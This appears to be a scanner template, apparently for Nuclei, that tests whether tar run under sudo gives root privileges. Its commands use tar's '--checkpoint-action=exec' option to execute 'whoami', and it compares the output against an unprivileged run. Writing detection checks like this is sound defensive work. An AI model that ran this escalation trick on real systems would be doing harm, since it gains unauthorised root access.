code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami

    '
id: privesc-tar
info:
  author: daffainfo
  description: 'tar is a command-line utility used to create and manipulate archive
    files. It is commonly used for bundling multiple files and directories into a
    single archive, often used in conjunction with compression tools like gzip or
    bzip2.

    '
  metadata:
    max-request: 3
    verified: true
  name: tar - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/tar/
  severity: high
  tags: code,linux,tar,privesc,local
self-contained: true
